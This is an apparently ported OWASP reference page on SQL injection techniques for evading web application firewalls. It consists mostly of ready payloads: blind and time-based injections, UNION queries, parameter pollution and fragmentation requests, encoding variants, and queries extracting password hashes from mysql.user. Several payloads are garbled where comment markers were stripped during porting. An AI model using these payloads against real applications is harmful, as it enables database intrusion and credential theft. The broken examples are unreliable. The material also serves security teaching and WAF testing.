# SQL Injection Bypassing WAF

> [!NOTE]
> Regrettably, this content has been programmatically ported from the previous OWASP wiki page. Below is the cleaned and formatted guide on bypassing Web Application Firewalls (WAF) using SQL Injection (SQLi) techniques.

---

## 1. What is SQL Injection (SQLi)?
A SQL injection attack consists of insertion or "injection" of a SQL query via the input data from the client to the application. A successful SQL injection exploit can:
* Read sensitive data from the database.
* Modify database data (`INSERT`, `UPDATE`, `DELETE`).
* Execute administration operations on the database (such as shutting down the DBMS).
* Recover the content of a given file present on the DBMS file system.
* Issue commands to the operating system in some cases.

SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input in order to effect the execution of predefined SQL commands.

### Basic Concepts
There are two main types of SQL Injection parameters:
1. **SQL Injection into a String/Char parameter**
   * *Example:* `SELECT * from table where example = 'Example'`
2. **SQL Injection into a Numeric parameter**
   * *Example:* `SELECT * from table where id = 123`

Exploitation of SQL Injection vulnerabilities is divided into classes according to the DBMS type and injection conditions.
* *Example (Insert/Update/Delete vulnerability):* 
  ```sql
  UPDATE users SET pass = '1' where user = 't1' OR 1=1--'
  ```

---

## 2. Blind SQL Injection
Used when the application does not display database errors or data directly.

* *Example payload (MySQL):*
  ```sql
  SELECT * from table where id = 1 AND if((ascii(lower(substring((select user()),$i,1))))!=$s,1,benchmark(200000,md5(now())))
  ```
* *Example payloads (Time-Based / Sleep):*
  ```sql
  SLEEP(5)--
  SELECT BENCHMARK(1000000,MD5('A'));
  id=1 OR SLEEP(25)=0 LIMIT 1--
  id=1) OR SLEEP(25)=0 LIMIT 1--
  id=1' OR SLEEP(25)=0 LIMIT 1--
  id=1') OR SLEEP(25)=0 LIMIT 1--
  id=1)) OR SLEEP(25)=0 LIMIT 1--
  id=SELECT SLEEP(25)--
  ```

### Exploitation features for various DBMSs
* **MySQL:** 
  ```sql
  SELECT * from table where id = 1 union select 1,2,3
  ```
* **PostgreSQL:** 
  ```sql
  SELECT * from table where id = 1; select 1,2,3
  ```

---

## 3. Bypassing WAF: SQL Injection - Normalization Method

### Example 1: Request Normalization Vulnerability
This method works in case of cleaning dangerous traffic, rather than blocking the entire request.
* **Original Safe Request:**
  ```http
  /?id=1+union+select+1,2,3/*
  ```
* **Bypassed Request (if WAF has a normalization bug):**
  ```http
  /?id=1/ union /union/ select /select+1,2,3/*
  ```
* **Result after WAF processing:**
  The request becomes:
  ```http
  index.php?id=1/ uni X on /union/ sel X ect /select+1,2,3/*
  ```

### Example 2: Excessive Cleaning Vulnerability
This method works in case of excessive cleaning of incoming data (replacing a regular expression match with an empty string).
* **Original Safe Request:**
  ```http
  /?id=1+union+select+1,2,3/*
  ```
* **Bypassed Request:**
  ```http
  /?id=1+un/ /ion+sel/ /ect+1,2,3'
  ```
* **Result after WAF stripping `/.../`:**
  The SQL request becomes:
  ```sql
  SELECT * from table where id = 1 union select 1,2,3'
  ```
  *(Note: Instead of `/**/`, any symbol sequence that the WAF cuts off can be used, e.g., `#####`, `%00`)*

---

## 4. Bypassing WAF: Using HTTP Parameter Pollution (HPP)
Successful HPP attacks depend on the environment of the application being attacked (analyzed by Luca Carettoni & Stefano diPaola).

* **Original Blocked Request:**
  ```http
  /?id=1;select+1,2,3+from+users+where+id=1'
  ```
* **Bypassed Request using HPP:**
  ```http
  /?id=1;select+1&id=2,3+from+users+where+id=1'
  ```

### Vulnerable Code Example
```asp
SQL = "select key from table where id= " + Request.QueryString("id")
```
* **Bypass Payload:**
  ```http
  /?id=1/ */union/ &id= /select/ &id= /pwd/ &id= /from/ &id=*/users
  ```
* **SQL Output after server concatenation:**
  ```sql
  select key from table where id=1/ */union/ , /select/ , /pwd/ , /from/ ,*/users
  ```

---

## 5. Bypassing WAF: HTTP Parameter Fragmentation (HPF)
Uses multiple input parameters to split the SQL query payload.

### Vulnerable Code Example
```php
Query("select * from table where a=".$_GET['a']." and b=".$_GET['b']);
Query("select * from table where a=".$_GET['a']." and b=".$_GET['b']." limit ".$_GET['c']);
```
* **Original Blocked Request:**
  ```http
  /?a=1+union+select+1,2/*
  ```
* **Bypassed Requests using HPF:**
  ```http
  /?a=1+union/ &b= /select+1,2
  /?a=1+union/ &b= /select+1,pass/ &c= /from+users'
  ```
* **SQL Output after concatenation:**
  ```sql
  select * from table where a=1 union/* and b= /select 1,2
  select * from table where a=1 union/ and b= /select 1,pass/ limit */from users'
  ```

---

## 6. Bypassing WAF: Blind SQL Injection - Logical Requests
Many WAFs miss logical request variations.

* **Bypass using Hex/Logical operations:**
  ```http
  /?id=1+OR+0x50=0x50
  /?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74
  ```
* **Using alternate operators:**
  Instead of `=`, you can use negation and inequality signs: `!=`, `<>`, `<`, `>`.

### Replacing SQL Functions with Synonyms
Avoid WAF signatures by replacing blocked functions:
* `substring()` $\rightarrow$ `mid()`, `substr()`
* `ascii()` $\rightarrow$ `hex()`, `bin()`
* `benchmark()` $\rightarrow$ `sleep()`

### Wide Variety of Logical Requests
```sql
and 1
or 1
and 1=1
and 2<3
and 'a'='a'
and 'a'<>'b'
and char(32)=' '
and 3<=2
and 5<=>4
and 5<=>5
and 5 is null
or 5 is not null
```

---

## 7. Notation Variations (Equivalent Meaning)
Bypassing signature filters by changing how strings and functions are written.

### Example: Extracting password hashes
* **Standard:**
  ```sql
  select user from mysql.user where user = 'user' OR mid(password,1,1)='*'
  ```
* **Hex notation:**
  ```sql
  select user from mysql.user where user = 'user' OR mid(password,1,1)=0x2a
  ```
* **Unhex function:**
  ```sql
  select user from mysql.user where user = 'user' OR mid(password,1,1)=unhex('2a')
  ```
* **Regexp matching:**
  ```sql
  select user from mysql.user where user = 'user' OR mid(password,1,1) regexp '[*]'
  ```
* **Like operator:**
  ```sql
  select user from mysql.user where user = 'user' OR mid(password,1,1) like '*'
  ```
* **Rlike operator:**
  ```sql
  select user from mysql.user where user = 'user' OR mid(password,1,1) rlike '[*]'
  ```
* **Ord/Ascii function:**
  ```sql
  select user from mysql.user where user = 'user' OR ord(mid(password,1,1))=42
  select user from mysql.user where user = 'user' OR ascii(mid(password,1,1))=42
  ```
* **Find_in_set:**
  ```sql
  select user from mysql.user where user = 'user' OR find_in_set('2a',hex(mid(password,1,1)))=1
  ```
* **Locate/Position:**
  ```sql
  select user from mysql.user where user = 'user' OR position(0x2a in password)=1
  select user from mysql.user where user = 'user' OR locate(0x2a,password)=1
  ```

### String Comparison Replacements
* **Standard:**
  ```sql
  substring((select 'password'),1,1) = 0x70
  substr((select 'password'),1,1) = 0x70
  mid((select 'password'),1,1) = 0x70
  ```
* **Using `strcmp`:**
  ```sql
  strcmp(left('password',1), 0x69) = 1
  strcmp(left('password',1), 0x70) = 0
  strcmp(left('password',1), 0x71) = -1
  ```
  *(Note: STRCMP(expr1,expr2) returns 0 if the strings are the same, -1 if the first argument is smaller than the second one, and 1 otherwise).*

---

## 8. Signature Bypass Examples
* **Blocked Signature:**
  ```http
  /?id=1+union+(select+1,2+from+users)
  ```
* **Bypass Permutations:**
  ```http
  /?id=1+union+(select'xz'from+xxx)
  /?id=(1)union(select(1),mid(hash,1,32)from(users))
  /?id=1+union+(select'1',concat(login,hash)from+users)
  /?id=(1)union(((((((select(1),hex(hash)from(users))))))))
  /?id=(1)or(0x50=0x50)
  ```

---

## Conclusion
A SQL Injection attack can successfully bypass WAF protections using:
1. **Request normalization bugs** in WAF parser.
2. **HTTP Parameter Pollution (HPP)** and **HTTP Parameter Fragmentation (HPF)**.
3. **Signature bypass permutations** (alternate syntax, hex encoding, parenthesis routing).
4. **Blind SQL Injection** using function synonyms and logical comparison variations.
